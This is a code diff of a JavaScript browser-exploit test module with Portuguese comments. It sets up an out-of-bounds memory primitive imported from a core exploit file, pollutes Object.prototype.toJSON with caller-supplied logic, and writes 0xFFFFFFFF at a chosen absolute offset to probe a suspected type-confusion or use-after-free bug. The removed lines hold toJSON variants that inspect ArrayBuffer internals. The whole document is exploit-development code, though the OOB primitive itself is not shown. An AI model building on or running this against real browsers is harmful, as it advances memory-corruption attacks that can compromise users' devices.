@@ -1,117 +1,138 @@
-// js/script3/runAllAdvancedTestsS3.mjs
+// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
-import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
-import { executePPThenOOBWriteTest, globalCallCount_toJSON } from './testJsonTypeConfusionUAFSpeculative.mjs';
-import { OOB_CONFIG } from '../config.mjs'; // Importado para OOB_CONFIG
-import { toHex } from '../utils.mjs'; // Importar toHex se usado nas funções toJSON
+import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
+import {
+    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
+    oob_write_absolute, clearOOBEnvironment
+} from '../core_exploit.mjs';
+import { OOB_CONFIG } from '../config.mjs';
 
-const ppKeyConst = 'toJSON';
+const TEST_PARAMS = {
+    victim_ab_size: 64, // Não usado diretamente com stringify neste teste, mas pode influenciar heap
+    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
+    value_to_write: 0xFFFFFFFF,
+    bytes_to_write_for_corruption: 4,
+    ppKeyToPollute: 'toJSON',
+};
 
-// COPIE AQUI A SUA FUNÇÃO originalFreezingPollutedToJSON que estava causando o congelamento
-// e vamos chamá-la de toJSON_A_OriginalCongelante
-function toJSON_A_OriginalCongelante() {
-    const FNAME_toJSON = "originalFreezingToJSON_InTest";
-    globalCallCount_toJSON++;
-    if (globalCallCount_toJSON === 1) {
-        document.title = `toJSON Call ${globalCallCount_toJSON} (OriginalCongelante)`;
+// Contador global importado de runAllAdvancedTestsS3.mjs para ser resetado por ele
+export let globalCallCount_toJSON = 0; // Removido 'export', será gerenciado pelo chamador se necessário
+
+export async function executePPThenOOBWriteTest(
+    testVariantDescription,
+    toJSONFunctionLogic // A função que será usada como Object.prototype.toJSON
+) {
+    const FNAME_TEST = `executePPThenOOBWrite<${testVariantDescription}>`;
+    const {
+        victim_ab_size,
+        corruption_offset,
+        value_to_write,
+        bytes_to_write_for_corruption,
+        ppKeyToPollute,
+    } = TEST_PARAMS;
+
+    logS3(`--- Iniciando Teste (PP then OOB Write): ${testVariantDescription} ---`, "test", FNAME_TEST);
+    logS3(`   Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}`, "info", FNAME_TEST);
+    document.title = `Iniciando: ${testVariantDescription}`;
+
+    // Resetar o contador global a partir do runAllAdvancedTestsS3 ou aqui se for específico
+    // Para este design, runAllAdvancedTestsS3 irá gerenciar o reset antes de cada chamada a esta função
+    // ou a própria função toJSON pode usar um contador local/closure se preferir total isolamento.
+    // Para o globalCallCount_toJSON ser efetivo como contador entre chamadas da mesma toJSON dentro de um stringify,
+    // ele precisa ser resetado FORA da lógica da toJSON, antes do stringify.
+    // Se cada toJSONFunctionLogic tem seu próprio contador interno, isso não é um problema.
+    // A versão atual em runAllAdvancedTestsS3 reseta globalCallCount_toJSON implicitamente ao redefinir as funções.
+    // Vamos assumir que as funções toJSON usam o globalCallCount_toJSON importado para este exemplo.
+    // No runAllAdvancedTestsS3.mjs, cada função toJSON_VariantX usa o globalCallCount_toJSON.
+    // É crucial que o `runAllAdvancedTestsS3.mjs` resete `globalCallCount_toJSON = 0;` antes de chamar `executePPThenOOBWriteTest`
+    // se a intenção é que cada teste de variante comece a contagem do zero para suas chamadas internas de toJSON.
+    // OU, mais simples, cada `toJSON_VariantX` usa um contador local se as chamadas não são aninhadas de forma complexa.
+    // A implementação atual das variantes de toJSON em runAllAdvancedTestsS3 já usa globalCallCount_toJSON.
+    // E a `runSimplificationStepByStep` não o reseta entre chamadas a `executePPThenOOBWriteTest`.
+    // Para este teste específico, queremos que `globalCallCount_toJSON` seja resetado antes de CADA `executePPThenOOBWriteTest`.
+    // Portanto, o reset deve estar em `runSimplificationStepByStep` ou aqui.
+    // Vamos colocar o reset aqui para garantir que cada execução desta função comece limpa.
+    globalCallCount_toJSON = 0; 
+
+
+    await triggerOOB_primitive();
+    if (!oob_array_buffer_real) {
+        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
+        document.title = "ERRO: Falha OOB Setup";
+        return;
     }
+    document.title = "OOB Configurado";
 
-    const currentOperationThis = this;
-    logS3(`[${ppKeyConst} Poluído - OriginalCongelante] Chamada ${globalCallCount_toJSON}!`, "vuln", FNAME_toJSON);
-    // ... (resto da sua lógica original "v2 - Refinado" que congela, incluindo DataView, slice, etc.)
-    // Para este exemplo, vou manter a estrutura que usei antes para V1,
-    // certifique-se que esta é a que CONGELA para você.
-    logS3(`  [CALL ${globalCallCount_toJSON}] typeof this: ${typeof currentOperationThis}`, "info", FNAME_toJSON);
-    try {
-        logS3(`  [CALL ${globalCallCount_toJSON}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME_toJSON);
-    } catch (e) { /*...*/ }
+    let victim_ab = new ArrayBuffer(victim_ab_size); // Criado, mas JSON.stringify não será chamado nele neste teste
+    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
 
-    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
+    let pollutionAppliedThisRun = false;
+    let stepReached = "antes_pp";
+    let potentiallyFroze = true; 
+
     try {
-        details.byteLength = currentOperationThis.byteLength;
-        // Bloco DataView (presente nesta variante original)
-        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
-            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
-            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
-            if (bufferToView.byteLength >= offsetInView + 4) {
-               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
+        logS3(`Tentando poluir Object.prototype.${ppKeyToPollute} com lógica: ${testVariantDescription}`, "info", FNAME_TEST);
+        document.title = `Aplicando PP: ${testVariantDescription}`;
+        stepReached = "aplicando_pp";
+
+        Object.defineProperty(Object.prototype, ppKeyToPollute, {
+            value: toJSONFunctionLogic,
+            writable: true, configurable: true, enumerable: false
+        });
+        pollutionAppliedThisRun = true;
+        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
+        stepReached = "pp_aplicada";
+        document.title = `PP Aplicada: ${testVariantDescription}`;
+
+        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
+        stepReached = "antes_escrita_oob";
+        document.title = `Antes Escrita OOB: ${testVariantDescription}`;
+
+        oob_write_absolute(corruption_offset, value_to_write, bytes_to_write_for_corruption);
+        
+        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
+        stepReached = "apos_escrita_oob";
+        document.title = `Após Escrita OOB: ${testVariantDescription}`;
+        potentiallyFroze = false; 
+
+        // NÃO chamaremos JSON.stringify(victim_ab) aqui. O foco é o congelamento na escrita OOB.
+        // Apenas uma leitura de controle para ver se a primitiva ainda está viva.
+        try {
+            logS3("Tentando leitura de controle da oob_dataview_real...", "info", FNAME_TEST);
+            let testRead = oob_dataview_real.getUint32(0, true);
+            logS3(`Leitura de controle da oob_dataview_real (offset 0) retornou: ${toHex(testRead)}`, "good", FNAME_TEST);
+            document.title = `Leitura DV OK: ${testVariantDescription}`;
+        } catch (e_dv) {
+            logS3(`ERRO ao ler da oob_dataview_real: ${e_dv.name} - ${e_dv.message}`, "error", FNAME_TEST);
+            document.title = `ERRO Leitura DV: ${testVariantDescription}`;
+            // Se a leitura falhar, isso não é o congelamento que estamos procurando, mas é um erro.
+            potentiallyFroze = false; // Foi um erro JS, não um congelamento silencioso na escrita OOB.
+        }
+
+    } catch (mainError) {
+        stepReached = "erro_principal";
+        document.title = `ERRO Principal: ${testVariantDescription}`;
+        potentiallyFroze = false;
+        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
+        console.error(mainError);
+    } finally {
+        if (pollutionAppliedThisRun) {
+            if (originalToJSONDescriptor) {
+                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
+            } else {
+                delete Object.prototype[ppKeyToPollute];
             }
         }
-        details.slice_exists = (typeof currentOperationThis.slice === 'function');
-        logS3(`  [CALL ${globalCallCount_toJSON}] Detalhes: byteLength=${details.byteLength}, 1stDword=${toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON);
-        return { toJSON_executed_A: true, details_byteLength: details.byteLength };
-    } catch (e) {
-        logS3(`  [${ppKeyConst} Poluído - A] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
-        document.title = `ERRO toJSON Call ${globalCallCount_toJSON} (A)`;
-        return { toJSON_error_A: true, message: e.message };
+        clearOOBEnvironment();
+        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
+        if (potentiallyFroze) { // Se não chegou a "apos_escrita_oob" ou um erro explícito
+            logS3(`O TESTE PODE TER CONGELADO DURANTE/APÓS A ESCRITA OOB. Último passo logado: ${stepReached}`, "warn", FNAME_TEST);
+            document.title = `CONGELOU? Passo: ${stepReached} - ${testVariantDescription}`;
+        }
     }
-}
-
-// Variante B: Sem a parte do DataView e first_dword
-function toJSON_B_NoDataView() {
-    const FNAME_toJSON = "toJSON_NoDataView_InTest";
-    globalCallCount_toJSON++;
-    if (globalCallCount_toJSON === 1) {
-        document.title = `toJSON Call ${globalCallCount_toJSON} (NoDataView)`;
+    logS3(`--- Teste (PP then OOB Write) Concluído: ${testVariantDescription} (Chamadas toJSON (se houver): ${globalCallCount_toJSON}) ---`, "test", FNAME_TEST);
+    if (!potentiallyFroze) {
+        document.title = `Teste Concluído Sem Congelamento na Escrita OOB: ${testVariantDescription}`;
     }
-    const currentOperationThis = this;
-    logS3(`[${ppKeyConst} Poluído - NoDataView] Chamada ${globalCallCount_toJSON}!`, "vuln", FNAME_toJSON);
-    logS3(`  [CALL ${globalCallCount_toJSON}] typeof this: ${typeof currentOperationThis}`, "info", FNAME_toJSON);
-    try {
-        logS3(`  [CALL ${globalCallCount_toJSON}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME_toJSON);
-    } catch (e) { /*...*/ }
-
-    let details = { byteLength: "N/A", slice_exists: "N/A" };
-    try {
-        details.byteLength = currentOperationThis.byteLength; // Mantém byteLength
-        details.slice_exists = (typeof currentOperationThis.slice === 'function'); // Mantém slice check
-        logS3(`  [CALL ${globalCallCount_toJSON}] Detalhes (NoDataView): byteLength=${details.byteLength}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON);
-        return { toJSON_executed_B: true, details_byteLength: details.byteLength };
-    } catch (e) {
-        logS3(`  [${ppKeyConst} Poluído - B] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
-        document.title = `ERRO toJSON Call ${globalCallCount_toJSON} (B)`;
-        return { toJSON_error_B: true, message: e.message };
-    }
-}
-
-
-async function runSimplificationStepByStep() {
-    const FNAME_RUNNER = "runSimplificationStepByStep";
-    logS3(`==== INICIANDO Simplificação Passo a Passo do toJSON Congelante ====`, 'test', FNAME_RUNNER);
-
-    const tests = [
-        { desc: "A_OriginalCongelante", func: toJSON_A_OriginalCongelante },
-        { desc: "B_NoDataView", func: toJSON_B_NoDataView },
-        // Adicionaremos mais variantes aqui nos próximos passos
-    ];
-
-    for (const test of tests) {
-        logS3(`\n--- Executando com toJSON Lógica: ${test.desc} ---`, 'subtest', FNAME_RUNNER);
-        // A função executePPThenOOBWriteTest já foi definida em testJsonTypeConfusionUAFSpeculative.mjs
-        // e aceita a lógica toJSON como parâmetro.
-        await executePPThenOOBWriteTest(test.desc, test.func);
-        await PAUSE_S3(MEDIUM_PAUSE_S3); 
-        
-        // Verifique o document.title aqui manualmente ou adicione um log dele se não congelar.
-        logS3(`   Título da página após teste ${test.desc}: ${document.title}`, "info");
-    }
-
-    logS3(`==== Simplificação Passo a Passo do toJSON CONCLUÍDA (Verificar qual congelou) ====`, 'test', FNAME_RUNNER);
-}
-
-export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_SimplifyToJSONFreeze';
-    const runBtn = getRunBtnAdvancedS3();
-    const outputDiv = getOutputAdvancedS3();
-
-    if (runBtn) runBtn.disabled = true;
-    if (outputDiv) outputDiv.innerHTML = '';
-
-    logS3(`==== INICIANDO Script 3: Simplificação de toJSON para Analisar Congelamento ====`,'test', FNAME);
-    document.title = "Iniciando Script 3 - Simplificação toJSON";
-    
-    await runSimplificationStepByStep();
-    
-    logS3(`\n==== Script 3 CONCLUÍDO (Simplificação de toJSON) ====`,'test', FNAME);
-    if (runBtn) runBtn.disabled = false;
 }
